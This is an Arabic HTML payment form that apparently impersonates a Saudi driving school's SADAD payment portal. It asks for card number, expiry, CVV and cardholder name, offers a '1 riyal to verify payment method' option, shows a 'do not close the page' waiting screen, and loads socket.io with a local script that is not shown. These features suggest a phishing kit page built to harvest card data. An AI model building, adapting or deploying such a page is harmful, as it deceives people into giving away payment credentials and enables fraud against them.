<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دلة للقيادة</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
    <script src="js/paym_dallah.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }
        
        .btn-warning {
            background-color: #D74D1C;
            border-color: #D74D1C;
            height: 50px;
        }
        
        .form-control, .form-select {
            height: 50px;
        }
        
        .error-message {
            color: #dc3545;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        
        .error-message.show {
            display: block;
        }
        
        .form-control.is-invalid {
            border-color: #dc3545;
        }
        
        /* شاشة الانتظار */
        .waiting-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .waiting-screen.active {
            display: flex;
        }
        
        .spinner {
            width: 80px;
            height: 80px;
            border: 8px solid #f3f3f3;
            border-top: 8px solid #D74D1C;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .waiting-text {
            color: #2c3e50;
            font-size: 20px;
            margin-top: 30px;
            text-align: center;
        }
        
        .waiting-text h4 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #D74D1C;
        }
        
        .waiting-text p {
            font-size: 16px;
            opacity: 0.7;
            color: #666;
        }
    </style>
</head>

<body>

    <!-- شاشة الانتظار -->
    <div class="waiting-screen" id="waitingScreen">
        <div class="spinner"></div>
        <div class="waiting-text">
            <h4>جاري معالجة الدفع...</h4>
            <p>يرجى الانتظار، لا تغلق الصفحة</p>
        </div>
    </div>

    <nav class="text-center py-2 shadow-sm">
        <img src="assets/logo.png" width="150" alt="">
    </nav>

    <div class="modal fade" id="myModal" tabindex="-1" aria-labelledby="cardModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-body p-0">
                    <img src="assets/photo_2025-05-31_23-53-39.jpg" class="img-fluid" alt="">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-warning text-light w-100" data-bs-dismiss="modal">متابعة</button>
                </div>
            </div>
        </div>
    </div>

    <div class="container mt-5">
        <h5 class="text-dark text-center fw-bold">معلومات الدفع الإلكتروني <img src="assets/sadad_edited.avif" width="60" alt=""></h5>

        <div class="mt-5 text-center">
            <small class="py-2 px-5 w-100" style="background-color: #d5e0be;border-radius: 13px;">دفع آمن 100% ... بياناتك معنا في حماية وأمان</small>
        </div>

        <div class="mt-5 d-flex justify-content-between px-4">
            <h6 class="pt-2">البطاقات المقبولة</h6>
            <img src="assets/29526e_e2993b81095b4de88b83b6d7832c21ce~mv2.avif" width="150" alt="">
        </div>

        <div class="mt-5 px-4">
            <form id="paymentForm" method="POST">

                <label for="" class="mb-3 fw-bold">قيمة المبلغ المراد تسديده <span class="text-danger fw-bold">*</span></label>
                <div class="d-flex align-items-center gap-2 mb-2">
                    <input type="radio" class="form-check-input" checked value="1" name="amount" required>
                    <label for="">1 ريال لإثبات طريقة الدفع</label>
                </div>
                <div class="d-flex align-items-center gap-2 mb-2">
                    <input type="radio" class="form-check-input" value="500" name="amount" required>
                    <label for="">500 ريال سعودي</label>
                </div>
                <div class="d-flex align-items-center gap-2 mb-2">
                    <input type="radio" class="form-check-input" name="amount" value="750" required>
                    <label for="">750 ريال سعودي</label>
                </div>
                <div class="d-flex align-items-center gap-2 mb-2">
                    <input type="radio" class="form-check-input" name="amount" value="1200" required>
                    <label for="">1200 ريال سعودي</label>
                </div>
                <div class="d-flex align-items-center gap-2 mb-2">
                    <input type="radio" class="form-check-input" name="amount" value="1450" required>
                    <label for="">1450 ريال سعودي</label>
                </div>
                <div class="d-flex align-items-center gap-2 mb-2">
                    <input type="radio" class="form-check-input" name="amount" value="2760" required>
                    <label for="">2760 ريال سعودي</label>
                </div>

                <div class="mt-4 shadow px-4 pb-5" style="border-radius: 10px; background-color: #f8f9fa;">
                    <h5 class="text-dark text-center fw-bold pt-4 mb-4">يرجى إدخال معلومات البطاقة</h5>

                    <div class="mb-3">
                        <input type="text" name="cardNumber" id="cardNumberI" style="direction: ltr !important;" inputmode="numeric" maxlength="19" required class="text-center form-control" placeholder="">
                        <div class="error-message" id="cardError">رقم البطاقة يجب أن يكون 16 رقماً صحيحاً</div>
                    </div>
                    
                    <div class="d-flex mt-3 gap-4">
                        <div class="flex-grow-1">
                            <input type="text" name="year" inputmode="numeric" id="expiry" maxlength="5" required class="form-control" placeholder="MM/YY">
                            <div class="error-message" id="expiryError">تاريخ الانتهاء غير صحيح (MM/YY)</div>
                        </div>
                        <div class="flex-grow-1">
                            <input type="text" name="cvv" inputmode="numeric" maxlength="3" required class="text-center form-control" placeholder="CVV">
                            <div class="error-message" id="cvvError">رمز الحماية يجب أن يكون 3 أرقام</div>
                        </div>
                    </div>

                    <div class="mt-3">
                        <input type="text" name="cardName" required class="form-control text-center" placeholder="اسم حامل البطاقة">
                        <div class="error-message" id="nameError">يرجى إدخال اسم حامل البطاقة</div>
                    </div>

                    <div class="text-center mt-4">
                        <button type="submit" id="butSubm" class="btn btn-warning text-light fw-bold d-flex justify-content-center align-items-center w-100">تسديد</button>
                    </div>
                </div>

            </form>

        </div>
    </div>


</body>
</html>
